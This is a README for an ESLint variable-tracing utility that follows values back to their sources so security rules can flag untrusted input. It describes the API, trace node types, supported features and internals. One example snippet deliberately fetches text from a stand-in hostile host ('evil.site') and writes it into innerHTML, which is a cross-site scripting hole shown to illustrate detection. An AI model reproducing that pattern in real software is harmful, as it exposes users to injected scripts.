# Tracing algorithm

When writing ESLint rules (especially those that need to ensure that specific
information does not flow to specific nodes) it often becomes necessary to be
able to trace the definition of an expression back to its source.

This is where this utility comes into play. Consider the following code snippet
that introduces a cross-site scripting vulnerability:

```ts
let aValue = "I am totally safe";

if (Math.random() > 0.5) {
  aValue = "Still safe!";
} else if (Math.random() > 0.8) {
  aValue = await (await fetch("evil.site")).text();
}

document.body.innerHTML = aValue;
```

When simply observing the value that `innerHTML` is assigned to it is not
immediately obvious that the code may introduce a cross-site scripting attack.
Of course, a rule could simply flag it as potentially vulnerable without
determining the source of the value, but that may result in a bunch of false
positives.

Ideally, we would like to easily determine that the assigned value could take the
form of either `I am totally safe`, `Still safe` or `fetch()`. Only then would
we be able to see that the value could potentially take the form of uncontrolled
input through the fetch request.

This is exactly what the `traceVariable` utility aims to help with. In particular,
if we run this function on the value `aValue` from the snippet above, then the
output below may be printed to the console (if configured):

```bash
root --> aValue (Variable/1) --> "I am totally safe" (Literal/2/constant/reassign)

root --> aValue (Variable/1) --> "Still safe!" (Literal/2/constant/reassign)

root --> aValue (Variable/1) --> fetch (/7/reassign) --> Global(fetch)
```

## Usage

The variable tracer can be used as seen below:

```ts
traceVariable(
  {
    node,
    context, // eslint rule-context
  },
  {
    onNodeVisited: (node: TraceNode) => {
      // In case you're not interested in following the trace that the current
      // variable you can return "stopFollowingVariable: true" in order to
      // preserve performance.
      // However, if you wish to stop the trace altogehter you can return
      // "halt: true".
      return { stopFollowingVariable: false; halt: true };
    },
    onFinished: () => {
      // ...
    }
  }
);
```

Where the callback `onNodeVisited` is called every time the tracer encounters a
new [Trace Node](#trace-nodes). In other words, the callback is triggered every
time we encounter a new definition of the value that we are tracing, if we reach
a source or if we cannot trace any further.

However, often it is necessary to know the context of the whole `Trace` that the
function is following and not just the current node that we are visiting. In
this case, the callbacks can be decorated with the `withTrace` function that
introduces traces into the context. A `Trace` is known as the path we followed
from the node that we trace back to a given source, including all intermediate
definitions.

```ts
let targetNode: TSESTree.Node | undefined;

traceVariable(
  {
    node,
    context,
  },
  withTrace({
    onNodeVisited: (currentTrace: [RootNode, ...TraceNode[]], node: TraceNode) => {
      if (isNodeTerminalNode(node) && isIdentifier(node.astNode)) {
        targetNode = node.astNode;

        return { halt: true };
      }
    },
    onTraceFinished: (trace: [RootNode, ...TraceNode[]]) => {
      // may, for example, output "root --> aValue (Variable/1) --> fetch (/7/reassign) --> Global(fetch)"
      printTrace(trace);

      // onTraceFinished may also return "stopFollowingVariable" and "halt"
      return { halt: true };
    },
    onFinished: () => {
      // ...
    }
  })
);
```

Do note that the tracing executes efficiently and **synchronously**. This means
that the callbacks that you have defined may set the value of variables defined
before the call to `traceVariable` as seen in the code snippet above.

## Trace Nodes

The nodes returned in the tracer callbacks are *not* regular ESLint ESTree nodes.
Instead, they are a special node known as a `Trace Node`.

Trace nodes exist in a variety of different types as specified below.

### Variable Node

Variable Nodes are generated every time we can trace the definition of a value
to another variable.

This Node will always be the "body" of a trace from the target value to the source.

### Terminal Node

Terminal Nodes can be considered the end of a trace, and they can take several
different forms, specifying different data based on the type of the terminal.

In particular, the following Terminal Nodes exist:

* `ConstantTerminalNode`
* `ImportTerminalNode`
* `GlobalTerminalNode`
* `UnresolvedTerminalNode`
* `NodeTerminalNode`

### Root Node

The root node that exists will always be the start of a `Trace`. It does not contain
any particular information itself but is simply a specification that it is the
start of a Trace.

## Support

The algorithm is still a work in progress and thus not perfect. The current state
of known issues can be tracked by observing the unit tests provided for the tracer.

We also believe it may be relevant to re-think the API of the function to shift
away from being callback-based since it may contribute to introduce
[Callback Hell](http://callbackhell.com/) in rule implementations.

However, with that being said, then the tracer supports a significant subset of
the JavaScript/TypeScript language including the following:

* Arrays *(including rest and spread operations)*
* Objects *(including rest and spread operations)*
* Expressions *(all)*
* Functions *(including parameter to argument tracing)*
* Import/Export *(with limited support for dynamic import and require() statements)*
* Statements *(such as ForOfLoops)*
* Globals *(e.g. Object/Promise/fetch etc.)*
* Limited understanding of vanilla JavaScript constructs *(e.g. `[].concat([])` means that we should trace both arrays)*
* Third party packages *(e.g. React, specifying relationships between `[getter, setter] = useState()` etc.)*

We are currently aware of the following limitations:

* Shortcomings in some of the existing handlers
* Mutability *(we do not detect mutations of traced nodes)*
* Exhaustive understanding of vanilla JavaScript constructs *(such as Set/Map etc.)*
* Lack of integration with more third-party packages

## Implementation details

The goal of the tracer is to trace from an initial ESTree Node following as many
relevant ESTree Variables as possible.

Overall the method uses a simple FIFO (First-in-first-out) queue on which new ESTree Variables that
should be followed can be pushed into. This means that we first trace
depth-first. Every time a variable (or terminal) is consumed in the FIFO queue
the `onNodeVisted` callback of the external API is triggered. When the queue is
empty the algorithm ends triggering the `onFinished` callback.

For each Variable that we encounter we use [Visitor](#visitors) functions to
determine how we should trace the given variable (i.e. which ESTree nodes we
should be looking at). Once determined these *Visitors* transfer the
responsibility of how individual TSESTree Nodes should be handled to our
[Handler](#handlers) functions.

Finally, it may at times be required to override the default behaviour of how
function calls, literals and import statements are handled and in these cases,
our [Override](#overrides) functions take over.

### Visitors

Visitor functions describe how variables should be handled to allow further
tracing. These could be specifications of how `Parameter`s should be handled,
`Import bindings` and `Global Variables`.

Once the proper path has been determined the Visitors delegate the
responsibility to our [Handlers](#handlers) which in turn attempts to trace
(through ESTree Nodes) to the next ESTree Variable (or terminal) that should be
added to the queue.

### Handlers

Handler functions describe how we should handle a given `ESTree Node`
to continue the trace. Examples of handlers could be specifications of how
`Call Expression`s, `Import Specifier`s and `Literal`s should be handled to
to continue the trace.

These functions will either continue the trace (by returning a new call to
`handleNode`) on its relevant properties or, if it can be mapped to an ESTree
Variable or a terminal, the handled will return a [Trace Node](#trace-nodes).

### Overrides

Since we do not handle tracing into external packages (included in the default
JavaScript library) it is at times necessary to define overrides specifying how
to handle specific ESTree Nodes.

As an example consider the following call:

```ts
document.body.innerHTML = [1, 2, 3].concat([4, 5, 6]).join("");
```

Due to our domain knowledge, we know that the following will resolve to the string `123456`, however, the default tracing algorithm has no way of inferring what the function invocations above will return. Thus, the above without any overrides, would not have been able to include the context of the array inside the `concat()` invocation.

Overrides may occur at three different stages:

* At `Import Bindings` *(e.g.`React.useState() -> ...`)*
* At `Call Expressions` *(e.g. `arr.concat(arr2) -> arr + arr2`)*
* At `Literals` *(e.g. `__dirname -> "__dirname"`)*
